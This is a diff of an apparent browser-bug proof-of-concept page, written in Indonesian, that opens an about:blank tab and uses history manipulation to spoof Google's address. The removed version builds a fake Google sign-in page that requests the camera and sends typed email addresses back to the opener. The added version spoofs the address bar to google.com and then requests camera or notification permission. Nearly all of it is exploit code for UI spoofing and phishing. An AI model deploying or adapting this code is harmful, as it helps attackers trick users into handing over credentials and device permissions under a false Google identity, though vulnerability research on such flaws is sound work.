@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Spoof + Camera Permission</title>
+<title>Pure Address Bar & Permission Spoof</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
@@ -20,13 +20,12 @@
 </head>
 <body>
 
-<h1>📸 Google Spoof + Camera Permission</h1>
+<h1>🔍 Pure Address Bar & Permission Spoof</h1>
 
 <div class="panel">
-  <p style="color:#aaa; margin-bottom:20px;">Uji apakah prompt kamera bisa muncul dari halaman palsu Google di about:blank.</p>
-  <button id="btnCameraRace">1. Race: about:blank + replaceState + Kamera</button>
-  <button id="btnCameraPush">2. about:blank + pushState + Kamera</button>
-  <button id="btnCameraDirect">3. about:blank + Kamera (tanpa history)</button>
+  <p style="color:#aaa; margin-bottom:20px;">Menguji apakah URL di address bar bisa diubah menjadi Google saat meminta izin kamera/notifikasi.</p>
+  <button id="btnCamera">1. Request Kamera (Ubah Address Bar ke Google)</button>
+  <button id="btnNotif">2. Request Notifikasi (Ubah Address Bar ke Google)</button>
   <button id="clear" style="background:#555; margin-top:10px;">Bersihkan Log</button>
 </div>
 
@@ -50,254 +49,104 @@
   }
 
   // ============================================
-  // KONTEN HALAMAN GOOGLE PALSU + KAMERA
+  // LOGIKA UTAMA: ABOUT:BLANK + HISTORY MANIPULATION + PERMISSION
   // ============================================
-  function getGoogleCameraHTML(manipulateHistory) {
-    return `
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Sign in - Google Accounts</title>
-        <style>
-          * { box-sizing: border-box; margin: 0; padding: 0; }
-          body {
-            font-family: 'Google Sans', Roboto, Arial, sans-serif;
-            background: #f0f4f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-          }
-          .login-card {
-            background: #fff;
-            padding: 48px 40px 36px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
-          }
-          .google-logo {
-            font-size: 24px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 8px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-          }
-          .g-icon {
-            width: 32px;
-            height: 32px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="%23EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="%234285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="%23FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="%2334A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>') no-repeat center;
-            background-size: contain;
-          }
-          h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 10px; }
-          p.subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
-          input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; outline: none; }
-          input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-          .btn-row { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
-          .btn-create { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; background: none; border: none; padding: 8px; }
-          .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
-          .btn-next:hover { background: #1765cc; }
-          .footer { margin-top: 40px; font-size: 12px; color: #5f6368; }
-          .camera-area { margin-top: 20px; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; display: none; }
-          video { width: 100%; max-width: 200px; border-radius: 4px; }
-        </style>
-      </head>
-      <body>
-        <div class="login-card">
-          <div class="google-logo"><div class="g-icon"></div><span>Sign in with Google</span></div>
-          <h1>Sign in</h1>
-          <p class="subtitle">to continue to Gmail</p>
-          <input type="email" id="email" placeholder="Email or phone" autofocus />
-          <div class="btn-row">
-            <button class="btn-create">Create account</button>
-            <button class="btn-next" id="nextBtn">Next</button>
-          </div>
-          <div class="camera-area" id="cameraArea">
-            <p style="font-size:12px;color:#666;">Camera feed:</p>
-            <video id="video" autoplay playsinline></video>
-          </div>
-          <div class="footer">This is a UI Spoofing PoC — not a real Google page.</div>
-        </div>
-        <script>
-          (function() {
-            var statusEl = document.createElement('div');
-            statusEl.style.cssText = 'position:fixed;bottom:10px;right:10px;font-size:10px;color:#999;background:#fff;padding:4px 8px;border-radius:4px;';
-            document.body.appendChild(statusEl);
-            statusEl.textContent = 'Origin: ' + location.origin + ' | Href: ' + location.href;
+  function runSpoofTest(type) {
+    log(`=== MENGUJI: ${type.toUpperCase()} ===`, 'info');
 
-            ${manipulateHistory ? `
-              try {
-                history.replaceState({ spoof: true }, 'Sign in - Google Accounts', 'https://accounts.google.com/signin/v2/identifier');
-                parent.postMessage({ status: 'replaceState_success', url: 'https://accounts.google.com/signin/v2/identifier' }, '*');
-              } catch(e) {
-                parent.postMessage({ status: 'replaceState_fail', error: e.name + ': ' + e.message }, '*');
-              }
-              try {
-                history.pushState({ spoof: true }, 'Sign in - Google Accounts', 'https://accounts.google.com/signin/v2/identifier');
-                parent.postMessage({ status: 'pushState_success', url: 'https://accounts.google.com/signin/v2/identifier' }, '*');
-              } catch(e) {
-                parent.postMessage({ status: 'pushState_fail', error: e.name + ': ' + e.message }, '*');
-              }
-              try { document.title = 'Sign in - Google Accounts'; } catch(e) {}
-            ` : ''}
-
-            // Fungsi minta kamera
-            function requestCamera() {
-              if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                parent.postMessage({ status: 'no_camera_api' }, '*');
-                return;
-              }
-              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then(function(stream) {
-                  parent.postMessage({ status: 'camera_granted' }, '*');
-                  document.getElementById('cameraArea').style.display = 'block';
-                  document.getElementById('video').srcObject = stream;
-                })
-                .catch(function(err) {
-                  parent.postMessage({ status: 'camera_error', error: err.name + ': ' + err.message }, '*');
-                });
-            }
-
-            // Panggil kamera segera setelah halaman dimuat
-            // (race condition: sebelum origin null diterapkan?)
-            requestCamera();
-
-            // Juga panggil setelah 100ms
-            setTimeout(requestCamera, 100);
-
-            document.getElementById('nextBtn').addEventListener('click', function() {
-              parent.postMessage({ status: 'login_attempt', email: document.getElementById('email').value }, '*');
-            });
-
-            parent.postMessage({ status: 'origin_info', origin: location.origin, href: location.href }, '*');
-          })();
-        <\/script>
-      </body>
-      </html>
-    `;
-  }
-
-  // ============================================
-  // METODE 1: Race + replaceState + Kamera
-  // ============================================
-  document.getElementById('btnCameraRace').onclick = () => {
-    log('=== METODE 1: Race + replaceState + Kamera ===', 'info');
-
+    // 1. Buka tab about:blank
     const win = window.open('about:blank', '_blank');
-    if (!win) { log('❌ Popup diblokir.', 'error'); return; }
+    if (!win) { log('❌ Popup diblokir. Izinkan popup.', 'error'); return; }
     log('Tab about:blank dibuka.', 'success');
 
+    // 2. Tulis script langsung ke about:blank
     try {
       win.document.open();
-      win.document.write(getGoogleCameraHTML(true));
+      // Script minimalis, tanpa UI, hanya manipulasi URL dan request izin
+      win.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head><title>Sistem Keamanan</title></head>
+        <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
+          <p>Memproses permintaan...</p>
+          <script>
+            (function() {
+              // A. Coba manipulasi URL Address Bar ke Google
+              try {
+                history.replaceState({}, 'Google', 'https://www.google.com');
+                parent.postMessage({ status: 'url_spoof_success', url: 'https://www.google.com' }, '*');
+              } catch(e) {
+                parent.postMessage({ status: 'url_spoof_fail', error: e.name + ': ' + e.message }, '*');
+              }
+
+              // B. Coba minta izin
+              setTimeout(function() {
+                if ('${type}' === 'camera') {
+                  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                      .then(function(stream) {
+                        parent.postMessage({ status: 'camera_granted' }, '*');
+                      })
+                      .catch(function(err) {
+                        parent.postMessage({ status: 'camera_error', error: err.name }, '*');
+                      });
+                  }
+                } else if ('${type}' === 'notification') {
+                  if ('Notification' in window) {
+                    Notification.requestPermission().then(function(p) {
+                      if (p === 'granted') {
+                        parent.postMessage({ status: 'notif_granted' }, '*');
+                      } else {
+                        parent.postMessage({ status: 'notif_denied' }, '*');
+                      }
+                    }).catch(function(e) {
+                      parent.postMessage({ status: 'notif_error', error: e.message }, '*');
+                    });
+                  }
+                }
+              }, 1000); // Delay 1 detik agar address bar sempat diubah
+            })();
+          <\/script>
+        </body>
+        </html>
+      `);
       win.document.close();
-      log('Konten Google palsu + kamera ditulis.', 'success');
+      log('Script injeksi berhasil dikirim.', 'success');
     } catch (e) {
-      log('❌ Gagal tulis: ' + e.message, 'error');
+      log('❌ Gagal menulis ke about:blank: ' + e.message, 'error');
       return;
     }
 
+    // 3. Listener pesan dari tab baru
     window.addEventListener('message', (e) => {
       if (e.data && e.data.status) {
         const s = e.data.status;
-        if (s === 'replaceState_success') log('🎯 replaceState BERHASIL ke: ' + e.data.url, 'success');
-        else if (s === 'replaceState_fail') log('❌ replaceState gagal: ' + e.data.error, 'error');
-        else if (s === 'pushState_success') log('🎯 pushState BERHASIL ke: ' + e.data.url, 'success');
-        else if (s === 'pushState_fail') log('❌ pushState gagal: ' + e.data.error, 'error');
-        else if (s === 'origin_info') log('📋 Origin: ' + e.data.origin + ' | Href: ' + e.data.href, 'info');
-        else if (s === 'camera_granted') log('🎯 BUG: IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!', 'success');
-        else if (s === 'camera_error') log('❌ Kamera gagal: ' + e.data.error, 'error');
-        else if (s === 'no_camera_api') log('❌ getUserMedia tidak didukung.', 'error');
-        else if (s === 'login_attempt') log('⚠️ Login attempt: ' + e.data.email, 'warn');
+        if (s === 'url_spoof_success') log('🎯 Address Bar BERHASIL diubah ke: ' + e.data.url, 'success');
+        else if (s === 'url_spoof_fail') log('❌ Address Bar GAGAL diubah: ' + e.data.error, 'error');
+        else if (s === 'camera_granted') log('🎯 IZIN KAMERA DIBERIKAN!', 'success');
+        else if (s === 'camera_error') log('❌ Kamera ditolak: ' + e.data.error, 'error');
+        else if (s === 'notif_granted') log('🎯 IZIN NOTIFIKASI DIBERIKAN!', 'success');
+        else if (s === 'notif_denied') log('❌ Notifikasi ditolak.', 'error');
       }
     }, { once: false });
 
-    log('Perhatikan: prompt kamera mungkin muncul seolah dari Google.', 'warn');
-    log('Jika izin diberikan, itu BUG (Critical).', 'info');
-  };
+    log('Perhatikan ADDRESS BAR tab baru:', 'warn');
+    log('1. Apakah berubah jadi google.com?', 'info');
+    log('2. Saat prompt izin muncul, apakah tertulis "artha231.github.io" atau "Google"?', 'info');
+  }
 
   // ============================================
-  // METODE 2: pushState + Kamera
+  // TOMBOL HANDLERS
   // ============================================
-  document.getElementById('btnCameraPush').onclick = () => {
-    log('=== METODE 2: pushState + Kamera ===', 'info');
+  document.getElementById('btnCamera').onclick = () => runSpoofTest('camera');
+  document.getElementById('btnNotif').onclick = () => runSpoofTest('notification');
 
-    const win = window.open('about:blank', '_blank');
-    if (!win) { log('❌ Popup diblokir.', 'error'); return; }
-    log('Tab about:blank dibuka.', 'success');
-
-    try {
-      win.document.open();
-      win.document.write(getGoogleCameraHTML(true));
-      win.document.close();
-      log('Konten Google palsu + kamera ditulis.', 'success');
-    } catch (e) {
-      log('❌ Gagal tulis: ' + e.message, 'error');
-    }
-
-    window.addEventListener('message', (e) => {
-      if (e.data && e.data.status) {
-        const s = e.data.status;
-        if (s === 'pushState_success') log('🎯 pushState BERHASIL ke: ' + e.data.url, 'success');
-        else if (s === 'pushState_fail') log('❌ pushState gagal: ' + e.data.error, 'error');
-        else if (s === 'origin_info') log('📋 Origin: ' + e.data.origin + ' | Href: ' + e.data.href, 'info');
-        else if (s === 'camera_granted') log('🎯 BUG: IZIN KAMERA DIBERIKAN!', 'success');
-        else if (s === 'camera_error') log('❌ Kamera gagal: ' + e.data.error, 'error');
-      }
-    }, { once: false });
-  };
-
-  // ============================================
-  // METODE 3: Kamera tanpa history manipulation
-  // ============================================
-  document.getElementById('btnCameraDirect').onclick = () => {
-    log('=== METODE 3: Kamera tanpa history ===', 'info');
-
-    const win = window.open('about:blank', '_blank');
-    if (!win) { log('❌ Popup diblokir.', 'error'); return; }
-    log('Tab about:blank dibuka.', 'success');
-
-    try {
-      win.document.open();
-      win.document.write(getGoogleCameraHTML(false));
-      win.document.close();
-      log('Konten Google palsu + kamera ditulis (tanpa history).', 'success');
-    } catch (e) {
-      log('❌ Gagal tulis: ' + e.message, 'error');
-    }
-
-    window.addEventListener('message', (e) => {
-      if (e.data && e.data.status) {
-        const s = e.data.status;
-        if (s === 'origin_info') log('📋 Origin: ' + e.data.origin + ' | Href: ' + e.data.href, 'info');
-        else if (s === 'camera_granted') log('🎯 BUG: IZIN KAMERA DIBERIKAN!', 'success');
-        else if (s === 'camera_error') log('❌ Kamera gagal: ' + e.data.error, 'error');
-      }
-    }, { once: false });
-  };
-
-  // ============================================
-  // CLEAR LOG
-  // ============================================
   document.getElementById('clear').onclick = () => {
     logEl.textContent = '';
     log('Log dibersihkan.', 'info');
   };
 
-  // ============================================
-  // INIT
-  // ============================================
-  log('PoC siap. Pilih metode di atas.', 'info');
-  log('⚠️ Browser modern memblokir kamera dari about:blank.', 'warn');
-  log('   Jika prompt muncul, itu BUG (Critical).', 'info');
-
+  log('PoC murni siap. Pilih tombol di atas.', 'info');
 })();
 </script>
 </body>
